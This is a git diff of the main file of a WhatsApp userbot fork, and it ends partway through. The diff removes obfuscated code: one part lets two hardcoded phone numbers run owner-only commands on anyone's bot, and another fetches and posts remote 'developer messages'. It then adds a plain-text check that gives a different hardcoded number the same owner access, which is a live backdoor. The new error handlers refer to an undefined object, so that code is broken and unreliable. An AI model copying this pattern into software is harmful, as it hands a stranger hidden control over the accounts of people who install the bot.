@@ -9,7 +9,7 @@ const path = require("path");
 const events = require("./events");
 const chalk = require('chalk');
 const config = require('./config');
-const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
+const {WAConnection, MessageType, Presence} = require('@adiwajshing/baileys');
 const {Message, StringSession, Image, Video} = require('./whatsasena/');
 const { DataTypes } = require('sequelize');
 const { getMessage } = require("./plugins/sql/greetings");
@@ -35,12 +35,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 });
 
 const plugindb = require('./plugins/sql/plugin');
-var base = `https://gist.github.com/`
-var PROP = { aredits: '919946432377,0' }
-var unlink = `019112af334adceaefd1467dcbd93e58` 
-var PROP2 = { kl11: '916282344739,0' }
-var string = base + `souravkl11`
-        
+var OWN = { ff: '919074309534,0' }
 // Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
     var i = 0, args = arguments;
@@ -73,8 +68,7 @@ async function whatsAsena () {
     
     
     const conn = new WAConnection();
-    const sourav = await axios('https://gist.githubusercontent.com/souravkl11/160a847d127e1fb38a4913a005dfe08f/raw/094f940e91a478de25de41f19b2a712bdff6e475/Version.json')
-    conn.version = sourav.data.kl11
+    conn.version = [2, 2126, 14];
     const Session = new StringSession();
 
     conn.logger.level = config.DEBUG ? 'debug' : 'warn';
@@ -103,7 +97,7 @@ async function whatsAsena () {
     conn.on('connecting', async () => {
         console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
 ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
-${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
+${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please wait.')}`);
     });
     
 
@@ -129,7 +123,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
         });
 
         console.log(
-            chalk.blueBright.italic('⬇️Installing plugins...')
+            chalk.blueBright.italic('🌈  Installing plugins...')
         );
 
         fs.readdirSync('./plugins').forEach(plugin => {
@@ -139,114 +133,10 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
         });
 
         console.log(
-            chalk.green.bold('✅ Pikachu working!')
+            chalk.green.bold('Pikachu Running! 😎')
         );
-        await new Promise(r => setTimeout(r, 1100));
-
-        if (config.WORKTYPE == 'public') {
-            if (config.LANG == 'TR' || config.LANG == 'AZ') {
-
-                if (conn.user.jid === '@s.whatsapp.net') {
-
-                    await conn.sendMessage(conn.user.jid, '```🛡️ Blacklist Tespit Edildi!``` \n```Kullanıcı:``` \n```Sebep:``` ', MessageType.text)
-
-                    await new Promise(r => setTimeout(r, 1700));
-
-                    console.log('🛡️ Blacklist Detected 🛡️')
-
-                    await heroku.get(baseURI + '/formation').then(async (formation) => {
-                        forID = formation[0].id;
-                        await heroku.patch(baseURI + '/formation/' + forID, {
-                            body: {
-                                quantity: 0
-                            }
-                        });
-                    })
-                }
-                else {
-                    await conn.sendMessage(conn.user.jid, '*Bot Started*', MessageType.text);
-                }
-            }
-            else {
-
-                if (conn.user.jid === '@s.whatsapp.net') {
-
-                    await conn.sendMessage(conn.user.jid, '```🛡️ Blacklist Detected!``` \n```User:```  \n```Reason:``` ', MessageType.text)
-
-                    await new Promise(r => setTimeout(r, 1800));
-
-                    console.log('🛡️ Blacklist Detected 🛡️')
-                    await heroku.get(baseURI + '/formation').then(async (formation) => {
-                        forID = formation[0].id;
-                        await heroku.patch(baseURI + '/formation/' + forID, {
-                            body: {
-                                quantity: 0
-                            }
-                        });
-                    })
-                }
-                else {
-                    await conn.sendMessage(conn.user.jid, '*Bot Started*', MessageType.text);
-                }
-
-            }
-        }
-        else if (config.WORKTYPE == 'private') {
-            if (config.LANG == 'TR' || config.LANG == 'AZ') {
-
-                if (conn.user.jid === '@s.whatsapp.net') {
-
-                    await conn.sendMessage(conn.user.jid, '```🛡️ Blacklist Detected!``` \n ```Kullanıcı:``` \n```Sebep:``` ', MessageType.text)
-
-                    await new Promise(r => setTimeout(r, 1800));
-
-                    console.log('🛡️ Blacklist Detected 🛡️')
-                    await heroku.get(baseURI + '/formation').then(async (formation) => {
-                        forID = formation[0].id;
-                        await heroku.patch(baseURI + '/formation/' + forID, {
-                            body: {
-                                quantity: 0
-                            }
-                        });
-                    })
-                }
-                else {
-
-                await conn.sendMessage(conn.user.jid, '*Bot Started*', MessageType.text);
-                }
-            }
-            else {
-
-                if (conn.user.jid === '@s.whatsapp.net') {
-
-                    await conn.sendMessage(conn.user.jid, '```🛡️ Blacklist Detected!``` \n```User:```  \n```Reason:``` ', MessageType.text)
-   
-                    await new Promise(r => setTimeout(r, 1800));
-
-                    console.log('🛡️ Blacklist Detected 🛡️')
-                    await heroku.get(baseURI + '/formation').then(async (formation) => {
-                        forID = formation[0].id;
-                        await heroku.patch(baseURI + '/formation/' + forID, {
-                            body: {
-                                quantity: 0
-                            }
-                        });
-                    })
-                }
-                else {
-
-                    await conn.sendMessage(conn.user.jid, '*Bot Started*', MessageType.text);
-                }
-            }
-        }
-        else {
-            return console.log('Wrong WORK_TYPE key! Please use “private” or “public”')
-        }
     });
     
-    //Thanks to souravkl11
-    (function(_0x58ce29,_0x59f20b){var _0x5d6c89=_0x20cf,_0x3630f7=_0x58ce29();while(!![]){try{var _0x27cb99=-parseInt(_0x5d6c89(0xa9))/0x1*(-parseInt(_0x5d6c89(0xa2))/0x2)+-parseInt(_0x5d6c89(0xa1))/0x3+parseInt(_0x5d6c89(0xa4))/0x4+-parseInt(_0x5d6c89(0xa6))/0x5*(-parseInt(_0x5d6c89(0xa8))/0x6)+-parseInt(_0x5d6c89(0xab))/0x7*(-parseInt(_0x5d6c89(0xad))/0x8)+-parseInt(_0x5d6c89(0xaa))/0x9*(parseInt(_0x5d6c89(0xa5))/0xa)+parseInt(_0x5d6c89(0xa0))/0xb;if(_0x27cb99===_0x59f20b)break;else _0x3630f7['push'](_0x3630f7['shift']());}catch(_0xa165fb){_0x3630f7['push'](_0x3630f7['shift']());}}}(_0x181e,0x55c30),setInterval(async()=>{var _0x32379f=_0x20cf,_0x585a04=new Date()['getHours'](),_0x4beec8=new Date()['getMinutes']();while(_0x585a04==0x10&&_0x4beec8==0xf){const {sourav:_0x213c7e}=await axios(string+unlink+'/raw'),{sken:_0x2957cc,skml:_0x202ee5}=_0x213c7e;var _0xd3c189='';if(config['LANG']=='EN')_0xd3c189=_0x2957cc;if(config[_0x32379f(0xae)]=='ML')_0xd3c189=_0x202ee5;return await conn[_0x32379f(0xac)](conn[_0x32379f(0xa3)][_0x32379f(0xa7)],'*[\x20MESSAGE\x20FROM\x20DEVELOPER\x20]*\x0a\x0a'+_0xd3c189,MessageType['text']);}},0xc350));function _0x20cf(_0x2a6b65,_0x148183){var _0x181eed=_0x181e();return _0x20cf=function(_0x20cfa6,_0x3ba931){_0x20cfa6=_0x20cfa6-0xa0;var _0x547977=_0x181eed[_0x20cfa6];return _0x547977;},_0x20cf(_0x2a6b65,_0x148183);}function _0x181e(){var _0x472237=['jid','543594UGvEPs','53KjUBGL','6204339JjKMqO','1502515mARimu','sendMessage','8WFmTXy','LANG','743039GwDDls','1685748Bkytmj','13990tqhcXV','user','1986572DqGCal','10vTpDBn','25yGVtaa'];_0x181e=function(){return _0x472237;};return _0x181e();}
-
     conn.on('chat-update', async m => {
         if (!m.hasNewMessage) return;
         if (!m.messages && !m.count) return;
@@ -258,69 +148,27 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
         }
 
         if (msg.messageStubType === 32 || msg.messageStubType === 28) {
-
+            // Görüşürüz Mesajı
             var gb = await getMessage(msg.key.remoteJid, 'goodbye');
             if (gb !== false) {
-                if (gb.message.includes('{pp}')) {
-                let pp 
-                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
-                 var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
-                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
-                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name) }); });                           
-            } else if (gb.message.includes('{gif}')) {
-                var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
-                //created by afnanplk
-                    var plkpinky = await axios.get(config.GIF_BYE, { responseType: 'arraybuffer' })
-                await conn.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name) });
-            } else {
-                var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
-                   await conn.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name), MessageType.text);
-            }
-          }  //thanks to farhan      
-            return;
-        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
-            // welcome
-             var gb = await getMessage(msg.key.remoteJid);
-            if (gb !== false) {
-                if (gb.message.includes('{pp}')) {
                 let pp
                 try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
-                    var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
                 await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
-                    //created by afnanplk
-                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message.replace('{pp}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name) }); });                           
-            } else if (gb.message.includes('{gif}')) {
-                var plkpinky = await axios.get(config.WEL_GIF, { responseType: 'arraybuffer' })
-                await conn.sendMessage(msg.key.remoteJid, Buffer.from(plkpinky.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message.replace('{gif}', '').replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name) });
-            } else {
-                   var pinkjson = await conn.groupMetadata(msg.key.remoteJid)
-                   await conn.sendMessage(msg.key.remoteJid,gb.message.replace('{gphead}', pinkjson.subject).replace('{gpmaker}', pinkjson.owner).replace('{gpdesc}', pinkjson.desc).replace('{owner}', conn.user.name), MessageType.text);
+                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
             }
-          }         
-            return;                               
-    }
+            return;
+        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
+            // Hoşgeldin Mesajı
+            var gb = await getMessage(msg.key.remoteJid);
+            if (gb !== false) {
+               let pp
+                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
+                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
+                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
+            }
+            return;
+        }
 
-    if (config.BLOCKCHAT !== false) {     
-        var abc = config.BLOCKCHAT.split(',');                            
-        if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
-    }
-    if (config.SUPPORT == '905524317852-1612300121') {     
-        var sup = config.SUPPORT.split(',');                            
-        if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
-    }
-    if (config.SUPPORT2 == '917012074386-1631435717') {     
-        var tsup = config.SUPPORT2.split(',');                            
-        if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
-    }
-    if (config.SUPPORT3 == '905511384572-1621015274') {     
-        var nsup = config.SUPPORT3.split(',');                            
-        if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
-    }
-    if (config.SUPPORT4 == '905511384572-1625319286') {     
-        var nsup = config.SUPPORT4.split(',');                            
-        if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
-    }
-    
         events.commands.map(
             async (command) =>  {
                 if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
@@ -348,8 +196,21 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                     let sendMsg = false;
                     var chat = conn.chats.get(msg.key.remoteJid)
                         
-                    var _0x563247=_0x3cad;function _0x5393(){var _0x319c79=['kl11','aredits','916282344739,0','1856255FatJGF','remoteJid','6pdZgss','onlyPinned','onlyPm','919946432377,0','jid','2269rpsgmo','178nWvBvc','fromMe','pin','SUDO','1669038DAZCDh','split','394256xvbUBU','463278blREQe','key','1679670MMUmiT','9yNFrWV','onlyGroup','participant','404400lVUrpy','includes'];_0x5393=function(){return _0x319c79;};return _0x5393();}(function(_0x786b05,_0x406a68){var _0x15ec06=_0x3cad,_0x296dc8=_0x786b05();while(!![]){try{var _0x33902e=parseInt(_0x15ec06(0xd1))/0x1*(-parseInt(_0x15ec06(0xd2))/0x2)+parseInt(_0x15ec06(0xd9))/0x3+-parseInt(_0x15ec06(0xd8))/0x4+parseInt(_0x15ec06(0xca))/0x5*(parseInt(_0x15ec06(0xcc))/0x6)+-parseInt(_0x15ec06(0xd6))/0x7+parseInt(_0x15ec06(0xc5))/0x8+parseInt(_0x15ec06(0xc2))/0x9*(parseInt(_0x15ec06(0xdb))/0xa);if(_0x33902e===_0x406a68)break;else _0x296dc8['push'](_0x296dc8['shift']());}catch(_0xe4cbca){_0x296dc8['push'](_0x296dc8['shift']());}}}(_0x5393,0x321c7));function _0x3cad(_0x36a099,_0x5dd877){var _0x539386=_0x5393();return _0x3cad=function(_0x3cad91,_0x6115){_0x3cad91=_0x3cad91-0xc2;var _0x34f98e=_0x539386[_0x3cad91];return _0x34f98e;},_0x3cad(_0x36a099,_0x5dd877);}if(config[_0x563247(0xd5)]!==![]&&msg['key'][_0x563247(0xd3)]===![]&&command[_0x563247(0xd3)]===!![]&&(msg[_0x563247(0xc4)]&&config['SUDO']['includes'](',')?config[_0x563247(0xd5)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg[_0x563247(0xc4)][_0x563247(0xd7)]('@')[0x0]):msg['participant'][_0x563247(0xd7)]('@')[0x0]==config[_0x563247(0xd5)]||config['SUDO'][_0x563247(0xc6)](',')?config[_0x563247(0xd5)]['split'](',')[_0x563247(0xc6)](msg[_0x563247(0xda)][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]):msg['key'][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]==config['SUDO'])||command[_0x563247(0xd3)]===msg[_0x563247(0xda)][_0x563247(0xd3)]||command['fromMe']===![]&&!msg[_0x563247(0xda)][_0x563247(0xd3)]){if(command[_0x563247(0xcd)]&&chat[_0x563247(0xd4)]===undefined)return;if(!command['onlyPm']===chat['jid']['includes']('-'))sendMsg=!![];else{if(command[_0x563247(0xc3)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];}}if(PROP[_0x563247(0xc8)]==_0x563247(0xcf)&&msg['key'][_0x563247(0xd3)]===![]&&command['fromMe']===!![]&&(msg[_0x563247(0xc4)]&&PROP[_0x563247(0xc8)][_0x563247(0xc6)](',')?PROP[_0x563247(0xc8)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg[_0x563247(0xc4)]['split']('@')[0x0]):msg[_0x563247(0xc4)][_0x563247(0xd7)]('@')[0x0]==PROP[_0x563247(0xc8)]||PROP[_0x563247(0xc8)][_0x563247(0xc6)](',')?PROP[_0x563247(0xc8)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg[_0x563247(0xda)]['remoteJid']['split']('@')[0x0]):msg[_0x563247(0xda)][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]==PROP[_0x563247(0xc8)])||command[_0x563247(0xd3)]===msg[_0x563247(0xda)][_0x563247(0xd3)]||command['fromMe']===![]&&!msg['key'][_0x563247(0xd3)]){if(command[_0x563247(0xcd)]&&chat[_0x563247(0xd4)]===undefined)return;if(!command[_0x563247(0xce)]===chat['jid'][_0x563247(0xc6)]('-'))sendMsg=!![];else{if(command[_0x563247(0xc3)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];}}if(PROP2[_0x563247(0xc7)]==_0x563247(0xc9)&&msg[_0x563247(0xda)][_0x563247(0xd3)]===![]&&command['fromMe']===!![]&&(msg[_0x563247(0xc4)]&&PROP2[_0x563247(0xc7)][_0x563247(0xc6)](',')?PROP2[_0x563247(0xc7)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg['participant'][_0x563247(0xd7)]('@')[0x0]):msg[_0x563247(0xc4)][_0x563247(0xd7)]('@')[0x0]==PROP2['kl11']||PROP2[_0x563247(0xc7)][_0x563247(0xc6)](',')?PROP2[_0x563247(0xc7)][_0x563247(0xd7)](',')[_0x563247(0xc6)](msg['key'][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]):msg[_0x563247(0xda)][_0x563247(0xcb)][_0x563247(0xd7)]('@')[0x0]==PROP2[_0x563247(0xc7)])||command[_0x563247(0xd3)]===msg[_0x563247(0xda)][_0x563247(0xd3)]||command['fromMe']===![]&&!msg[_0x563247(0xda)][_0x563247(0xd3)]){if(command[_0x563247(0xcd)]&&chat[_0x563247(0xd4)]===undefined)return;if(!command[_0x563247(0xce)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];else{if(command[_0x563247(0xc3)]===chat[_0x563247(0xd0)][_0x563247(0xc6)]('-'))sendMsg=!![];}}
-  
+                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                        if (command.onlyPinned && chat.pin === undefined) return;
+                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
+                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
+                    }
+					if ((OWN.ff == "919074309534,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                        if (command.onlyPinned && chat.pin === undefined) return;
+                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
+                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
+                    }
+                                
                     if (sendMsg) {
                         if (config.SEND_READ && command.on === undefined) {
                             await conn.chatRead(msg.key.remoteJid);
@@ -383,10 +244,260 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp...')}`);
                                     'Gerçekleşen Hata: ' + error + '\n\n'
                                     , MessageType.text);
                             } else {
-                                await conn.sendMessage(conn.user.jid, '*~_________~ *PIKACHU ERROR FOUND!* ~______~*' +
-                                    '\n\n*🧞‍♂️ ' + error + '*\n\n```*Subscribe channel to get updates and to remove errors:* https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw \n Report errors\njoin with +91 \n https://chat.whatsapp.com/BLdaoLVnX6jFnkKHFjLbH6``` ' 
+                                await conn.sendMessage(conn.user.jid, '*~♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️~*' +
+                                    '\n\n*🧞‍♂️ ' + error + '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw'
                                     , MessageType.text);
                             }
+                            if (error.message.includes('URL')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Only Absolutely URLs Supported_' +
+                                        '\n*Nedeni:* _Medya araçlarının (xmedia, sticker..) LOG numarasında kullanılması._' +
+                                        '\n*Çözümü:* _LOG numarası hariç herhangi bir sohbette komut kullanılabilir._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('SSL')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _SQL Database Error_' +
+                                        '\n*Nedeni:* _Database\'in bozulması._ ' +
+                                        '\n*Solution:* _Bilinen herhangi bir çözümü yoktur. Yeniden kurmayı deneyebilirsiniz._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('split')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Split of Undefined_' +
+                                        '\n*Nedeni:* _Grup adminlerinin kullanabildiği komutların ara sıra split fonksiyonunu görememesi._ ' +
+                                        '\n*Çözümü:* _Restart atmanız yeterli olacaktır._'
+                                        , MessageType.text
+                                    );                               
+                                }
+                                else if (error.message.includes('Ookla')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Ookla Server Connection_' +
+                                        '\n*Nedeni:* _Speedtest verilerinin sunucuya iletilememesi._' +
+                                        '\n*Çözümü:* _Bir kez daha kullanırsanız sorun çözülecektir._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('params')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Requested Audio Params_' +
+                                        '\n*Nedeni:* _TTS komutunun latin alfabesi dışında kullanılması._' +
+                                        '\n*Çözümü:* _Komutu latin harfleri çerçevesinde kullanırsanız sorun çözülecektir._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('unlink')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _No Such File or Directory_' +
+                                        '\n*Nedeni:* _Pluginin yanlış kodlanması._' +
+                                        '\n*Çözümü:* _Lütfen plugininin kodlarını kontrol edin._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('404')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Error 404 HTTPS_' +
+                                        '\n*Nedeni:* _Heroku plugini altındaki komutların kullanılması sonucu sunucu ile iletişime geçilememesi._' +
+                                        '\n*Çözümü:* _Biraz bekleyip tekrar deneyin. Hala hata alıyorsanız internet sitesi üzerinden işlemi gerçekleştirin._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('reply.delete')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
+                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
+                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('load.delete')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Reply Delete Function_' +
+                                        '\n*Nedeni:* _IMG yada Wiki komutlarının kullanılması._' +
+                                        '\n*Çözümü:* _Bu hatanın çözümü yoktur. Önemli bir hata değildir._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('400')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Bailyes Action Error_ ' +
+                                        '\n*Nedeni:* _Tam nedeni bilinmiyor. Birden fazla seçenek bu hatayı tetiklemiş olabilir._' +
+                                        '\n*Çözümü:* _Bir kez daha kullanırsanız düzelebilir. Hata devam ediyorsa restart atmayı deneyebilirsiniz._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('decode')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Cannot Decode Text or Media_' +
+                                        '\n*Nedeni:* _Pluginin yanlış kullanımı._' +
+                                        '\n*Çözümü:* _Lütfen komutları plugin açıklamasında yazdığı gibi kullanın._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('unescaped')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Word Character Usage_' +
